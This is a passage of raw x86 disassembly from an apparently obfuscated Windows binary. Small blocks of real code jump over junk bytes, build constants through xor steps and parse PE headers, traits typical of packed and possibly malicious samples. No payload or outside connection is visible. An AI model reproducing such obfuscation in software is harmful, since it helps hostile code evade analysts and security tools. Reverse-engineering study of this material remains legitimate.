  4112e2:	repnz sub edx,DWORD PTR [edi+0xe]
  4112e6:	fwait
  4112e7:	je     0x4115eb
  4112ed:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  4112f4:	lea    eax,[ebp-0x18]
  4112f7:	mov    DWORD PTR [ebp-0x14],eax
  4112fa:	mov    eax,DWORD PTR [ebp-0x14]
  4112fd:	add    DWORD PTR [eax],0x705fa8f
  411303:	mov    eax,DWORD PTR [ebp-0x10]
  411306:	jmp    0x4115d4
  41130b:	sub    al,0xc2
  41130d:	or     al,0xb3
  41130f:	lock jno 0x4112c3
  411312:	inc    ecx
  411313:	mov    ds:0x1568f61e,eax
  411318:	js     0x411386
  41131a:	fisttp WORD PTR [ecx+0x45]
  41131d:	jle    0x41139d
  41131f:	scas   eax,DWORD PTR es:[edi]
  411320:	jl     0x4113a0
  411322:	jle    0x41138b
  411324:	cmp    al,0xa6
  411326:	stos   BYTE PTR es:[edi],al
  411327:	imul   ecx,ecx,0x55
  41132a:	xor    al,0x2e
  41132c:	pop    edx
  41132d:	or     BYTE PTR [ecx-0x72df6e0c],dl
  411333:	int3   
  411334:	retf   0x695
  411337:	and    BYTE PTR [edi*8-0x56308bdd],0xdb
  41133f:	ds pop ebx
  411341:	call   0xc819:0x621a2b40
  411348:	xchg   edx,eax
  411349:	(bad)  
  41134a:	aas    
  41134b:	add    dh,ch
  41134d:	xor    bh,BYTE PTR [esi]
  41134f:	call   0x187c:0xf9cf3746
  411356:	(bad)
  41135a:	scas   al,BYTE PTR es:[edi]
  41135b:	stos   DWORD PTR es:[edi],eax
  41135c:	xor    al,0xad
  41135e:	cmp    DWORD PTR [ebp+0x6e],esp
  411361:	test   ch,dh
  411363:	ja     0x411312
  411365:	ret    0x63b0
  411368:	xor    BYTE PTR [edi+0x18],bh
  41136b:	int3   
  41136c:	pop    ecx
  41136d:	imul   eax,DWORD PTR es:[eax+0x69d32903],0xd3b599aa
  411378:	mov    ecx,0x9c8d75bb
  41137d:	pop    ss
  41137e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41137f:	lock stc 
  411381:	in     al,0x60
  411383:	dec    ecx
  411384:	xchg   ebp,eax
  411385:	aaa    
  411386:	add    esp,DWORD PTR ds:0xfcd812b9
  41138c:	retf   
  41138d:	xor    edx,DWORD PTR [esi]
  41138f:	dec    eax
  411390:	(bad)  
  411391:	neg    BYTE PTR [edi]
  411393:	or     dh,BYTE PTR [edi+0x64]
  411396:	imul   esp,eax,0xd30cbf0
  41139c:	clc    
  41139d:	sub    dh,BYTE PTR [ecx]
  41139f:	lods   al,BYTE PTR ds:[esi]
  4113a0:	pop    edi
  4113a1:	push   0xb
  4113a3:	inc    eax
  4113a4:	call   0x9dc68d82
  4113a9:	(bad)  
  4113aa:	jle    0x41139c
  4113ac:	das    
  4113ad:	les    esi,FWORD PTR [ebx+0x5808e332]
  4113b3:	xchg   ecx,eax
  4113b4:	adc    al,BYTE PTR [esi+ecx*1+0x732c0dc]
  4113bb:	and    DWORD PTR [ecx-0x13],ebp
  4113be:	sub    al,0x25
  4113c0:	mov    dh,0xfa
  4113c2:	call   0x5f09:0x5e14dca0
  4113c9:	sbb    al,0xcb
  4113cb:	int    0xe6
  4113cd:	adc    al,0x4a
  4113cf:	fiadd  DWORD PTR [edx-0x7c31b9fa]
  4113d5:	fstp   DWORD PTR ds:0x7daa74db
  4113db:	mov    al,ds:0x7e7bbef6
  4113e0:	dec    edi
  4113e1:	cmp    BYTE PTR [ebx-0x25d521db],ah
  4113e7:	xchg   DWORD PTR ds:0x74b93103,ecx
  4113ed:	push   edx
  4113ee:	xchg   DWORD PTR [ecx+esi*8+0x6b],edi
  4113f2:	test   al,0x30
  4113f4:	mov    eax,ds:0x3b988407
  4113f9:	dec    ebx
  4113fa:	repnz mov ebp,0x8870fadd
  411400:	inc    eax
  411401:	mov    bh,0xef
  411403:	sahf   
  411404:	cmc    
  411405:	push   eax
  411406:	hlt    
  411407:	push   ebp
  411408:	inc    ebp
  411409:	aad    0xa5
  41140b:	(bad)  
  41140c:	push   ss
  41140d:	add    al,0xf
  41140f:	enter  0xec59,0xfd
  411413:	fadd   st(3),st
  411415:	inc    esi
  411416:	aaa    
  411417:	pop    ss
  411418:	pop    ecx
  411419:	dec    BYTE PTR [edx+0x5e]
  41141c:	mov    dh,0xac
  41141e:	and    al,BYTE PTR [ecx+0x360bb9b9]
  411424:	mov    edx,0x5b6e2e48
  411429:	mov    ch,0xa2
  41142b:	(bad)  
  41142e:	push   ebx
  41142f:	ret    0xa53e
  411432:	out    dx,eax
  411433:	test   al,0xa0
  411435:	add    dh,BYTE PTR [ebx]
  411437:	call   0x257895fc
  41143c:	repz in eax,dx
  41143e:	and    al,al
  411440:	arpl   sp,di
  411442:	inc    edx
  411443:	pop    esp
  411444:	xchg   edx,eax
  411445:	paddw  mm4,mm5
  411448:	xor    esp,DWORD PTR [esp+0x7836535c]
  41144f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411450:	pop    eax
  411451:	pop    ss
  411452:	push   edi
  411453:	inc    ebp
  411454:	push   esp
  411455:	cmp    esp,DWORD PTR [ebx+0x57]
  411458:	jo     0x4113f1
  41145a:	ins    BYTE PTR es:[edi],dx
  41145b:	mov    al,BYTE PTR [edx]
  41145d:	sar    esi,0x15
  411460:	mov    dh,0x9f
  411462:	push   ss
  411463:	mov    edi,DWORD PTR [ecx-0x16e18601]
  411469:	mov    al,0x5b
  41146b:	xchg   esp,eax
  41146c:	or     DWORD PTR [ecx+0x38dad718],ebp
  411472:	mov    eax,ds:0x8f11b2ff
  411477:	or     esp,ebp
  411479:	push   ds
  41147a:	int3   
  41147b:	out    0x21,al
  41147d:	aam    0x34
  41147f:	(bad)  
  411480:	sub    DWORD PTR [esp+edi*1-0x384fccf9],ebx
  411487:	enter  0x65ec,0xa1
  41148b:	cmp    BYTE PTR [edi-0x21e1e030],dh
  411491:	adc    DWORD PTR [edx],esi
  411493:	aas    
  411494:	into   
  411495:	cld    
  411496:	int3   
  411497:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411498:	daa    
  411499:	cmp    edx,DWORD PTR [esi]
  41149b:	fistp  WORD PTR [eax-0x21]
  41149e:	pop    edi
  41149f:	out    0xc2,eax
  4114a1:	loope  0x4114ad
  4114a3:	sub    dl,ch
  4114a5:	sar    BYTE PTR [esi-0x4a],0x49
  4114a9:	dec    edx
  4114aa:	das    
  4114ab:	mov    DWORD PTR [ecx-0x47],esi
  4114ae:	aam    0x33
  4114b0:	(bad)  
  4114b1:	es out 0x84,eax
  4114b4:	push   ebx
  4114b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4114b6:	cli    
  4114b7:	loop   0x41150d
  4114b9:	xchg   esi,eax
  4114ba:	shl    DWORD PTR [esi+esi*8-0x40],1
  4114be:	xchg   esi,eax
  4114bf:	sahf   
  4114c0:	adc    al,dl
  4114c2:	and    ah,BYTE PTR [ebp+0x784c09a3]
  4114c8:	popf   
  4114c9:	out    dx,al
  4114ca:	sbb    DWORD PTR [ecx],ebx
  4114cc:	push   cs
  4114cd:	scas   al,BYTE PTR es:[edi]
  4114ce:	ins    BYTE PTR es:[edi],dx
  4114cf:	mov    al,0xbb
  4114d1:	or     eax,DWORD PTR [esi]
  4114d3:	inc    edx
  4114d4:	retf   
  4114d5:	add    ecx,DWORD PTR [ecx-0x2f863f2f]
  4114db:	sti    
  4114dc:	xor    esi,ebx
  4114de:	int    0xe0
  4114e0:	cmp    esi,DWORD PTR [ebx+0x1a8ce54f]
  4114e6:	xlat   BYTE PTR ds:[ebx]
  4114e7:	dec    edi
  4114e8:	add    eax,0x767bd55f
  4114ed:	(bad)  
  4114ee:	cld    
  4114ef:	mov    dl,0x93
  4114f1:	(bad)  
  4114f2:	push   ebp
  4114f3:	jo     0x4114b5
  4114f5:	mov    gs,WORD PTR [ecx+eax*8-0x12]
  4114f9:	mov    ecx,0x1a2f3cad
  4114fe:	popf   
  4114ff:	xor    al,0xdd
  411501:	std    
  411502:	in     eax,0x9d
  411504:	shl    BYTE PTR [eax-0x16],0xda
  411508:	fst    DWORD PTR [edx+0x7ed90270]
  41150e:	dec    esi
  41150f:	fstp   TBYTE PTR [esi-0x52]
  411512:	rcl    BYTE PTR [edx-0x3b37a33d],1
  411518:	jno    0x4114a3
  41151a:	outs   dx,BYTE PTR ds:[esi]
  41151b:	adc    DWORD PTR [ebx],ebx
  41151d:	(bad)  
  41151e:	xor    dh,BYTE PTR gs:[ecx]
  411521:	mov    al,0x82
  411523:	retf   0xb46c
  411526:	pop    ebx
  411527:	push   edi
  411528:	sti    
  411529:	dec    edi
  41152a:	stos   DWORD PTR es:[edi],eax
  41152b:	in     eax,dx
  41152c:	mov    esi,0x59d0a8a2
  411531:	xor    eax,0x5f6a4dce
  411536:	sub    eax,0x33bed08a
  41153b:	dec    edx
  41153c:	(bad)  
  41153e:	(bad)  
  41153f:	out    dx,eax
  411540:	(bad)  
  411542:	ins    DWORD PTR es:[edi],dx
  411543:	in     al,0xb2
  411545:	xor    al,0x8e
  411547:	add    al,0x51
  411549:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41154a:	js     0x4115c5
  41154c:	inc    ecx
  41154d:	mov    ch,0xef
  41154f:	fs (bad) 
  411551:	loop   0x4114f6
  411553:	adc    al,bl
  411555:	das    
  411556:	fsubr  st,st(0)
  411558:	and    edx,DWORD PTR [edi]
  41155a:	sub    BYTE PTR [edx+0x54],dh
  41155d:	pop    ss
  41155e:	ret    0x453d
  411561:	out    dx,eax
  411562:	xchg   edx,eax
  411563:	or     edx,DWORD PTR [edx]
  411565:	mov    al,0x3f
  411567:	pop    es
  411568:	ret    0x6831
  41156b:	sbb    ebp,edx
  41156d:	pop    es
  41156e:	mov    bl,0xb
  411570:	inc    eax
  411571:	(bad)  
  411572:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411573:	jno    0x411550
  411575:	ror    DWORD PTR [esi],cl
  411577:	add    dh,dl
  411579:	imul   ax,WORD PTR [ebx]
  41157d:	push   eax
  41157e:	pushf  
  41157f:	push   ebp
  411580:	loop   0x41151b
  411582:	mov    ds:0xfe29b598,eax
  411587:	stos   BYTE PTR es:[edi],al
  411588:	std    
  411589:	or     al,0xea
  41158b:	daa    
  41158c:	jb     0x411584
  41158e:	pusha  
  41158f:	mov    edx,0x69f8d5a4
  411594:	push   ds
  411595:	sub    ebp,edx
  411597:	in     al,0x82
  411599:	imul   ebp,DWORD PTR [edi-0x5b2571ca],0x9774e455
  4115a3:	mov    ebx,0xcc96f44c
  4115a8:	adc    DWORD PTR [eax-0x42ab798b],esi
  4115ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4115b0:	mov    dh,0x5
  4115b2:	lds    ebx,FWORD PTR [ebp+0x42dff41]
  4115b8:	out    dx,eax
  4115b9:	call   0x1e82:0xbc3a131b
  4115c0:	add    al,0xcc
  4115c2:	jb     0x41159b
  4115c4:	loop   0x411617
  4115c6:	and    DWORD PTR [ebp+0x736aca57],edi
  4115cc:	jl     0x4115dd
  4115ce:	cwde   
  4115cf:	lods   eax,DWORD PTR ds:[esi]
  4115d0:	inc    edx
  4115d1:	cdq    
  4115d2:	xor    al,0x47
  4115d4:	mov    edx,DWORD PTR [ebp+0x8]
  4115d7:	xor    eax,ecx
  4115d9:	lea    eax,[eax+edx*1+0x32729b]
  4115e0:	mov    DWORD PTR [ebp+0x8],eax
  4115e3:	inc    DWORD PTR [ebp+0xc]
  4115e6:	jmp    0x410fe6
  4115eb:	mov    eax,DWORD PTR [ebp-0x10]
  4115ee:	xor    eax,ecx
  4115f0:	mov    ecx,DWORD PTR [ebp+0x10]
  4115f3:	add    eax,esi
  4115f5:	mov    DWORD PTR [ecx],eax
  4115f7:	pop    esi
  4115f8:	leave  
  4115f9:	ret    0xc
  4115fc:	push   ebp
  4115fd:	mov    ebp,esp
  4115ff:	push   ecx
  411600:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  411607:	jmp    0x4117ce
  41160c:	mov    eax,ds:0x7129745c
  411611:	xor    DWORD PTR [ecx+0x74],esp
  411614:	in     eax,0xeb
  411616:	leave  
  411617:	outs   dx,DWORD PTR ds:[esi]
  411618:	and    DWORD PTR [esp+edx*1+0x76],esi
  41161c:	xchg   BYTE PTR [eax+0x7e],al
  41161f:	jle    0x4115c5
  411621:	jg     0x4116a1
  411623:	jle    0x411616
  411625:	stos   DWORD PTR es:[edi],eax
  411626:	aaa    
  411627:	inc    ecx
  411628:	das    
  411629:	outs   dx,DWORD PTR ds:[esi]
  41162a:	jbe    0x4115e8
  41162c:	cmp    esi,DWORD PTR [esi]
  41162e:	fst    DWORD PTR [ecx]
  411630:	sahf   
  411631:	nop
  411632:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411633:	dec    edi
  411634:	test   DWORD PTR [ebx-0x71847ba3],esp
  41163a:	rol    BYTE PTR [edx+0x19],1
  41163d:	jae    0x41163f
  41163f:	push   edi
  411640:	adc    esi,ebp
  411642:	jp     0x4115d2
  411644:	fucom  st(6)
  411646:	xor    eax,0x2782faef
  41164b:	(bad)  
  41164c:	adc    bl,BYTE PTR [eax]
  41164e:	bnd jle 0x4116b5
  411651:	int    0x4b
  411653:	(bad)  
  411654:	jmp    0x9e25:0x5322bcf5
  41165b:	xchg   esi,esp
  41165d:	or     eax,0x1bbe018
  411662:	inc    edi
  411663:	xor    BYTE PTR ds:0x202b4734,cl
  411669:	pop    ebx
  41166a:	pop    edi
  41166b:	cmp    eax,0x1e6eec5f
  411670:	daa    
  411671:	inc    edx
  411672:	dec    edi
  411673:	cwde   
  411674:	into   
  411675:	mov    eax,ds:0x6f797130
  41167a:	pop    ebp
  41167b:	mov    ecx,0x979cc9b0
  411680:	dec    ecx
  411681:	call   0x529f:0x138d806c
  411688:	add    ebp,0xffffffe9
  41168b:	push   eax
  41168c:	xchg   esp,eax
  41168d:	push   cs
  41168e:	imul   esp,DWORD PTR [ecx+0x65],0x957608c8
  411695:	loop   0x411669
  411697:	iret   
  411698:	add    al,0x87
  41169a:	sahf   
  41169b:	xchg   esp,eax
  41169c:	mov    bh,0x4e
  41169e:	leave  
  41169f:	jl     0x411629
  4116a1:	lds    ebp,FWORD PTR [esi]
  4116a3:	add    eax,0x212162db
  4116a8:	sbb    DWORD PTR [edx],0x443ecf6d
  4116ae:	cwde   
  4116af:	call   0xfde4:0xb80f5168
  4116b6:	cdq    
  4116b7:	out    0x3d,al
  4116b9:	xchg   ecx,eax
  4116ba:	test   BYTE PTR [ecx],al
  4116bc:	aaa    
  4116bd:	add    al,0x8e
  4116bf:	or     DWORD PTR [esi-0x79975d96],0xffffffd2
  4116c6:	sbb    edi,0x914691bf
  4116cc:	rcr    BYTE PTR [ebx+0x1f61824c],0xb6
  4116d3:	mov    esp,0x6533d855
  4116d8:	mov    cs,WORD PTR [edx+0x4823c528]
  4116de:	test   eax,0x45ac4ebf
  4116e3:	je     0x4116e6
  4116e5:	fisttp QWORD PTR [esi+0x56]
  4116e8:	adc    BYTE PTR [ecx+0x2492e553],ch
  4116ee:	add    ebx,DWORD PTR [ebx]
  4116f0:	add    dh,0x1e
  4116f3:	jnp    0x4116df
  4116f5:	retf   0xf18f
  4116f8:	pop    edi
  4116f9:	nop
  4116fa:	and    bh,BYTE PTR [edx]
  4116fc:	data16 int 0x3b
  4116ff:	dec    ebx
  411700:	add    edx,edi
  411702:	or     BYTE PTR [ecx-0x6b0cd406],ch
  411708:	add    edx,DWORD PTR [esi+0x2564c481]
  41170e:	out    0x44,al
  411710:	stos   DWORD PTR es:[edi],eax
  411711:	fimul  WORD PTR [ebx-0x6e]
  411714:	jmp    0x4116b7
  411716:	stos   DWORD PTR es:[edi],eax
  411717:	sub    cl,BYTE PTR [esi+0x73]
  41171a:	stos   BYTE PTR es:[edi],al
  41171b:	in     al,0xfa
  41171d:	cs aaa 
  41171f:	push   0x8db22945
  411724:	xchg   ebp,eax
  411725:	mov    edi,edi
  411727:	mov    dh,0x18
  411729:	xchg   edx,eax
  41172a:	mov    dh,BYTE PTR [edi]
  41172c:	(bad)  
  41172d:	xchg   edx,eax
  41172e:	sti    
  41172f:	(bad)  
  411732:	ja     0x4117af
  411734:	loope  0x4116c8
  411736:	pop    ebx
  411737:	in     eax,0xe8
  411739:	mov    ah,0x5f
  41173b:	mov    al,ds:0x7975f73f
  411740:	dec    edi
  411741:	pop    ebp
  411742:	les    edx,FWORD PTR [edx-0x753fff75]
  411748:	sub    al,ch
  41174a:	mov    dh,dh
  41174c:	arpl   WORD PTR [edx-0x80],bx
  41174f:	aas    
  411750:	adc    bl,ch
  411752:	dec    edx
  411753:	popa   
  411754:	xchg   esi,eax
  411755:	or     DWORD PTR [eax],edx
  411757:	xor    al,0xa3
  411759:	test   BYTE PTR [ecx],dl
  41175b:	push   0xffffffd2
  41175d:	push   ebp
  41175e:	rol    BYTE PTR [edx+esi*2-0x1b],0xb
  411763:	sub    eax,0xa479af7
  411768:	fiadd  DWORD PTR [ebp+0x5c]
  41176b:	add    DWORD PTR [edi+edx*2+0x3285b2d9],esp
  411772:	sbb    BYTE PTR [eax],dh
  411774:	xchg   esp,eax
  411775:	sar    BYTE PTR [ecx-0x4a],1
  411778:	sti    
  411779:	add    DWORD PTR ds:0xc44bc426,esp
  41177f:	cmp    bh,dl
  411781:	sub    cl,BYTE PTR [edi]
  411783:	in     al,dx
  411784:	icebp  
  411785:	cwde   
  411786:	cmp    BYTE PTR [esi-0x61],bl
  411789:	fisttp QWORD PTR [ebx-0x7f]
  41178c:	aam    0xd8
  41178e:	cmp    eax,0x77765cac
  411793:	mov    WORD PTR [edx-0x64],cs
  411796:	mov    dl,0x19
  411798:	jo     0x41172b
  41179a:	ret    
  41179b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41179c:	sahf   
  41179d:	rcr    BYTE PTR ds:0xad0717c4,0x6e
  4117a4:	ss pop edi
  4117a6:	mov    esi,DWORD PTR [ebx+0x74]
  4117a9:	jae    0x411739
  4117ab:	inc    eax
  4117ac:	xor    al,0x89
  4117ae:	push   esp
  4117af:	mov    ebp,0x59470b26
  4117b4:	mov    edi,0xc97531a
  4117b9:	es movs BYTE PTR es:[edi],BYTE PTR es:[esi]
  4117bc:	cdq    
  4117bd:	sub    DWORD PTR [edi],ecx
  4117bf:	fidiv  DWORD PTR [ecx+0x13]
  4117c2:	in     eax,0x78
  4117c4:	sub    ebp,DWORD PTR [edi]
  4117c6:	pop    esi
  4117c7:	out    0xbb,eax
  4117c9:	inc    ebx
  4117ca:	imul   esp,DWORD PTR [ecx-0x18],0x68
  4117ce:	mov    eax,DWORD PTR [ebp+0x8]
  4117d1:	mov    DWORD PTR ds:0x4337a3,0x423d
  4117db:	mov    al,BYTE PTR [eax]
  4117dd:	sub    DWORD PTR ds:0x4336ff,0x6d7d
  4117e7:	add    al,0x38
  4117e9:	xor    DWORD PTR ds:0x43379f,0x433703
  4117f3:	xor    al,0x46
  4117f5:	mov    DWORD PTR ds:0x43379f,0x735a
  4117ff:	cmp    al,0xc3
  411801:	jne    0x411aa4
  411807:	and    edx,0x7ba3
  41180d:	mov    eax,DWORD PTR [ebp+0x8]
  411810:	mov    ecx,DWORD PTR [ebp+0x8]
  411813:	add    ecx,DWORD PTR [eax+0x3c]
  411816:	and    DWORD PTR ds:0x43371b,0x4b8b
  411820:	mov    edx,0x7510854
  411825:	and    DWORD PTR ds:0x4337ab,0x0
  41182f:	mov    eax,ds:0x4337ab
  411834:	inc    eax
  411835:	mov    ds:0x4337ab,eax
  41183a:	cmp    DWORD PTR ds:0x4337ab,0xb
  411841:	jne    0x411887
  411847:	push   0x4338bc
  41184c:	push   0x761c
  411851:	push   0x2832
  411856:	push   0x3f0d
  41185b:	push   0x4923
  411860:	push   DWORD PTR [ebp-0x24]
  411863:	push   DWORD PTR [ebp-0x28]
  411866:	push   DWORD PTR [ebp-0xc]
  411869:	push   0x49e1
  41186e:	push   DWORD PTR [ebp-0x28]
  411871:	push   DWORD PTR [ebp-0x14]
  411874:	push   DWORD PTR [ebp-0x10]
  411877:	push   0x6b07
  41187c:	push   0x8d34
  411881:	call   DWORD PTR ds:0x4122b8
  411887:	cmp    DWORD PTR ds:0x4337ab,0xa
  41188e:	jne    0x41189f
  411894:	mov    eax,ds:0x4337ab
  411899:	inc    eax
  41189a:	mov    ds:0x4337ab,eax
  41189f:	cmp    DWORD PTR ds:0x4337ab,0x11
  4118a6:	jb     0x41182f
  4118ac:	mov    DWORD PTR [ebp+0x8],ecx
  4118af:	mov    eax,DWORD PTR [ebp-0x4]
  4118b2:	xor    eax,edx
  4118b4:	push   esi
  4118b5:	mov    esi,DWORD PTR [ebp+0x8]
  4118b8:	mov    ecx,0x32729b
  4118bd:	add    eax,ecx
  4118bf:	cmp    DWORD PTR [esi+0x54],eax
  4118c2:	pop    esi
  4118c3:	je     0x4118d1
  4118c9:	mov    eax,DWORD PTR [ebp+0x8]
  4118cc:	jmp    0x411ab1
  4118d1:	mov    eax,DWORD PTR [ebp-0x4]
  4118d4:	xor    eax,edx
  4118d6:	jmp    0x411a9d
  4118db:	mov    ebp,0xe1e4219a
  4118e0:	gs mov ecx,0x58658ca3
  4118e6:	stos   DWORD PTR es:[edi],eax
  4118e7:	aaa    
  4118e8:	out    dx,al
  4118e9:	aad    0x1e
  4118eb:	sub    al,0x4e
  4118ed:	jle    0x41196d
  4118ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4118f0:	jg     0x411970
  4118f2:	jle    0x41187a
  4118f4:	jb     0x4118fc
  4118f6:	jmp    0x4118e1
  4118f8:	adc    al,0xa5
  4118fa:	daa    
  4118fb:	dec    ecx
  4118fc:	out    0xa,eax
  4118fe:	std    
  4118ff:	cs sahf 
  411901:	sbb    edi,edi
  411903:	and    esp,ebp
  411905:	call   0x59f7:0x41fb2cd0
  41190c:	add    BYTE PTR [eax-0x5b],ch
  41190f:	int    0xf5
  411911:	sub    esp,DWORD PTR [ecx+0x1d]
  411914:	jge    0x4118da
  411916:	scas   eax,DWORD PTR es:[edi]
  411917:	xor    BYTE PTR [edx],cl
  411919:	outs   dx,BYTE PTR ds:[esi]
  41191a:	xor    ecx,DWORD PTR [ebx+0x5d]
  41191d:	and    BYTE PTR [esi],bl
  41191f:	bound  esp,QWORD PTR [ebp-0x7a]
  411922:	pop    esi
  411923:	sahf   
  411924:	push   ds
  411925:	cmp    BYTE PTR [esi-0x2],ch
  411928:	stos   BYTE PTR es:[edi],al
  411929:	jle    0x4118ef
  41192b:	imul   edi,esi,0x95461407
  411931:	pop    esi
  411932:	fnsave ds:0x6ef7a779
  411938:	inc    ecx
  411939:	inc    ecx
  41193a:	ins    DWORD PTR es:[edi],dx
  41193b:	mov    esp,0x86ddbf22
  411940:	jmp    0x9fda7443
  411945:	pushf  
  411946:	sub    edx,eax
  411948:	and    al,0x13
  41194a:	mov    ebp,0x25216f83
  41194f:	mov    al,bl
  411951:	arpl   di,si
  411953:	rcl    DWORD PTR [ebx-0x5f539f52],0xf0
  41195a:	add    eax,0x467177ae
  41195f:	fcom   st(5)
  411961:	xchg   ebx,eax
  411962:	adc    edi,DWORD PTR [ebx+eiz*8+0xf]
  411966:	sar    BYTE PTR [ebp+0x4c],1
  411969:	(bad)  
  41196a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41196b:	pop    es
  41196c:	adc    esi,DWORD PTR [edx]
  41196e:	xchg   ebp,eax
  41196f:	push   ecx
  411970:	punpckldq mm1,DWORD PTR [ebp+0x20b96702]
  411977:	add    BYTE PTR [eax-0x9],al
  41197a:	xor    bl,BYTE PTR [eax-0x1a]
  41197d:	aam    0x92
  41197f:	and    al,0xdd
  411981:	fisttp QWORD PTR [eax]
  411983:	icebp  
  411984:	xchg   ebx,eax
  411985:	ins    BYTE PTR es:[edi],dx
  411986:	inc    eax
  411987:	mov    eax,0xa9945c23
  41198c:	neg    BYTE PTR [edi-0x77feb227]
  411992:	xor    BYTE PTR [edi],dl
  411994:	mov    ds:0x46f84e20,al
  411999:	mov    ds:0xc2d6510d,eax
  41199e:	cmp    DWORD PTR [ecx+0x22],esi
  4119a1:	(bad)  
  4119a2:	das    
  4119a3:	retf   
  4119a4:	push   es
  4119a5:	je     0x411961
  4119a7:	out    dx,eax
  4119a8:	adc    al,BYTE PTR [edx+0x227f7a38]
  4119ae:	ins    BYTE PTR es:[edi],dx
  4119af:	sub    BYTE PTR [esi+edx*2-0x23d55fdb],dl
  4119b6:	mov    dl,0x58
  4119b8:	adc    ah,BYTE PTR [ecx+0x67f307cb]
  4119be:	and    dl,BYTE PTR ds:[esi-0x60b4047c]
  4119c5:	fnstenv [edi+0x2b8fd68e]
  4119cb:	repz mov ch,0xc7
  4119ce:	aad    0x2a
  4119d0:	fisttp QWORD PTR [edx+0x32]
  4119d3:	dec    ecx
  4119d4:	push   es
  4119d5:	jp     0x411997
  4119d7:	and    ebx,DWORD PTR [edx]
  4119d9:	stos   BYTE PTR es:[edi],al
  4119da:	lock and al,0xa6
  4119dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4119de:	jae    0x411a5c
  4119e0:	inc    ebp
  4119e1:	cmp    eax,0xba38067b
  4119e6:	xor    edx,DWORD PTR [ecx-0x3]
  4119e9:	pusha  
  4119ea:	sbb    eax,0xcd2cb8e1
  4119ef:	or     eax,0x4f1e28ed
  4119f4:	mov    bh,0xb8
  4119f6:	jnp    0x411a4f
  4119f8:	cdq    
  4119f9:	cmp    DWORD PTR [esi+ebx*1-0x7eb317af],0x4145946
  411a04:	jo     0x411a3d
  411a06:	or     eax,0xee1122d6
  411a0b:	or     ecx,esi
  411a0d:	neg    DWORD PTR [ebp+0x64]
  411a10:	dec    edi
  411a11:	jge    0x411a8f
  411a13:	repz inc ecx
  411a15:	jbe    0x411a3f
  411a17:	ds jge 0x411a29
  411a1a:	mov    cl,0xda
  411a1c:	test   DWORD PTR [ebp-0x34],esp
  411a1f:	ret    0x6903
  411a22:	cmp    DWORD PTR [esi+0x4b0d3fd9],0x45d1edee
  411a2c:	in     al,0x44
  411a2e:	enter  0xc188,0xf8
  411a32:	jg     0x411a29
  411a34:	retf   0xccfa
  411a37:	cmp    BYTE PTR [ebx+esi*2],bl
  411a3a:	cmp    BYTE PTR [edi],bl
  411a3c:	push   esi
  411a3d:	je     0x411a95
  411a3f:	mov    esi,0x82ea8dcf
  411a44:	jb     0x411a09
  411a46:	ins    BYTE PTR es:[edi],dx
  411a47:	ret    
  411a48:	dec    ebp
  411a49:	aam    0x56
  411a4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a4c:	ins    BYTE PTR es:[edi],dx
  411a4d:	xchg   ecx,eax
  411a4e:	sbb    BYTE PTR [edx+ebp*4+0xa0ab011],al
  411a55:	and    edi,DWORD PTR [edi+0x589dafe0]
  411a5b:	aaa    
  411a5c:	outs   dx,BYTE PTR ds:[esi]
  411a5d:	mov    cl,0xf0
  411a5f:	(bad)  
  411a60:	(bad)  
  411a61:	push   eax
  411a62:	xor    DWORD PTR [ecx+0x34],0xffffff98
  411a66:	fcmovnb st,st(2)
  411a68:	hlt    
  411a69:	inc    esp
  411a6a:	lods   al,BYTE PTR ds:[esi]
  411a6b:	or     BYTE PTR [ecx],0xc
  411a6e:	repnz mov edi,0x593e4a1b
  411a74:	sub    eax,edx
  411a76:	(bad)  
  411a77:	mov    eax,0x5cd6dbc9
  411a7c:	xchg   BYTE PTR [ebx+0x37],ch
  411a7f:	push   esi
  411a80:	rcr    eax,cl
  411a82:	inc    ebx
  411a83:	fimul  DWORD PTR [ecx-0x5db5c1eb]
  411a89:	(bad)  [eax+edx*4-0x4f100870]
  411a90:	(bad)  [ecx+0x3cc3fb4f]
  411a96:	scas   al,BYTE PTR es:[edi]
  411a97:	or     ch,cl
  411a99:	outs   dx,DWORD PTR ds:[esi]
  411a9a:	fs mov cl,0xd4
  411a9d:	add    eax,ecx
  411a9f:	jmp    0x411ab1
  411aa4:	mov    eax,DWORD PTR [ebp-0x4]
  411aa7:	xor    eax,0x7510854
  411aac:	add    eax,0x32729b
  411ab1:	leave  
  411ab2:	ret    0x4

Disassembly of section .data:

00412000 <.data>:
  412000:	sub    al,0x29
  412002:	add    DWORD PTR [eax],eax
  412004:	sub    DWORD PTR ss:[ecx],eax
  412007:	add    BYTE PTR [eax+0x29],al
  41200a:	add    DWORD PTR [eax],eax
  41200c:	dec    esi
  41200d:	sub    DWORD PTR [ecx],eax
  41200f:	add    BYTE PTR [eax+0x29],bl
  412012:	add    DWORD PTR [eax],eax
  412014:	bound  ebp,QWORD PTR [ecx]
  412016:	add    DWORD PTR [eax],eax
  412018:	ins    BYTE PTR es:[edi],dx
  412019:	sub    DWORD PTR [ecx],eax
  41201b:	add    BYTE PTR [esi+0x29],dh
  41201e:	add    DWORD PTR [eax],eax
  412020:	mov    BYTE PTR [ecx],ch
  412022:	add    DWORD PTR [eax],eax
  412024:	xchg   edx,eax
  412025:	sub    DWORD PTR [ecx],eax
  412027:	add    BYTE PTR [edx-0x5dfffed7],bl
  41202d:	sub    DWORD PTR [ecx],eax
  41202f:	add    BYTE PTR [esi-0x43fffed7],ch
  412035:	sub    DWORD PTR [ecx],eax
  412037:	add    dh,al
  412039:	sub    DWORD PTR [ecx],eax
  41203b:	add    dl,dl
  41203d:	sub    DWORD PTR [ecx],eax
  41203f:	add    ah,bl
  412041:	sub    DWORD PTR [ecx],eax
  412043:	add    ah,ch
  412045:	sub    DWORD PTR [ecx],eax
  412047:	add    ah,dh
